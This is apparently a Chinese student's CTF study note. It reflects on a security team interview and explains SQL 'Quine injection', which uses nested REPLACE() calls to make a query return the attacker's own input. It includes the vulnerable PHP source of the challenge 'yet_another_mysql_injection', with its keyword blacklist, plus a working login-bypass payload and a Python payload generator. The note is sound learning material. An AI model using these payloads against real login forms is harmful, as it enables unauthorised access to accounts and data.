# 整体总结
对这次 V&N 战队面试进行一次小总结

问了很多基础的问题（这里指的是面经上或者平时新生赛经常考到的点），基本上还是可以说的上来。
但是其中也有一些本来必须掌握的，我都没去怎么看过，比如sql注入这块，问了`时间盲注`和`二次注入`都不太熟没答上来。
其实后面想起来二次注入应该是有学过的，太紧张了加上也不算太熟所以一点记不起了

但是问了一些进阶的还有新的cve这些 我就有点知识面匮乏了
像`quine注入`、`peclcmd`、`filter-chain`、`xss到rce`、`cnext`、`React框架漏洞`

总的来说就是知识面太窄了，学的东西不够多。把一些基础补好之后还得多做点大赛题，积累点cve什么的吧（好像学东西就是从这学期的一些新生赛开始的，打的都是新生赛，害。。。）
# Quine注入
第一次接触到这个额词，V&N面试的时候被问我一脸懵，（其实让我做题的时候紧张的看不进去了）
## 什么是quine注入?

  quine是一种计算机程序，它不接受输入并产生自己源代码的副本作为唯一的输出.  
  在ctf应用中，Quine注入的目的就是使得输入输出一致，绕过限制登录。

## 构造原理

主要利用的就是sql中的`replace()`函数，就是字面意思（替换）

```sql
REPLACE(str, from_str, to_str)

#replace(a,b,c) 简单来说也就是把 a 中的 b 换成 c，如果 from_str 不存在于 str 中，则返回原始字符串
```
最基础的用法就是
```sql
select replace(".",char(46),".");
```
`chr(46)`就是`.`，所以这个语句的结果就是`.`。

我们接着构造
```sql
select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
```
得到几乎相同了只有一点细微的差别
![700](assets/Quine注入/file-20251217173850996.png)

最终payload：
```sql
replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
```
![900](assets/Quine注入/file-20251217172806694.png)
看到输入输出完全一样了
这个就解决了一些sql查询密码等问题，让查询结果永远等于他自己

## 例题
### 第五空间 2021【yet_another_mysql_injection】

`?source`拿到源代码：
```php
<?php
include_once("lib.php");
function alertMes($mes,$url){
    die("<script>alert('{$mes}');location.href='{$url}';</script>");
}

function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}

if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
    $username=$_POST['username'];
    $password=$_POST['password'];
    if ($username !== 'admin') {
        alertMes('only admin can login', 'index.php');
    }
    checkSql($password);
    $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
    $user_result=mysqli_query($con,$sql);
    $row = mysqli_fetch_array($user_result);
    if (!$row) {
        alertMes("something wrong",'index.php');
    }
    if ($row['password'] === $password) {
        die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
  }
}

if(isset($_GET['source'])){
  show_source(__FILE__);
  die;
}
?>
<!-- /?source -->
<html>
    <body>
        <form action="/index.php" method="post">
            <input type="text" name="username" placeholder="账号"><br/>
            <input type="password" name="password" placeholder="密码"><br/>
            <input type="submit" / value="登录">
        </form>
    </body>
</html>
```
就是简单的账号密码，账号为`admin`,密码是从数据库查询的密码
```sql
SELECT password FROM users WHERE username='admin' and password='$password';
```
会执行这条语句，其中`$password`是我们控制的。
这里按理来说其实是可以打盲注的。但是这里我们打Quine注入更简单，因为如果让查询结果等于输入，那我们的条件不久永真了吗，
这里有脚本
```python
sql = input ("输入你的sql语句,不用写关键查询的信息  形如 1'union select #\n")
sql2 = sql.replace("'",'"')
base = "replace(replace('.',char(34),char(39)),char(46),'.')"
final = ""
def add(string):
    if ("--+" in string):
        tem = string.split("--+")[0] + base + "--+"
    if ("#" in string):
        tem = string.split("#")[0] + base + "#"
    return tem
def patch(string,sql):
    if ("--+" in string):
        return sql.split("--+")[0] + string + "--+"
    if ("#" in string):
        return sql.split("#")[0] + string + "#"

res = patch(base.replace(".",add(sql2)),sql).replace(" ","/**/").replace("'.'",'"."')

print(res)
```
![](assets/Quine注入/file-20251217195614491.png)
就帮我们构造好了（-1后面有个`'`我忘记了）
![500](assets/Quine注入/file-20251217200038962.png)
输入就出了。

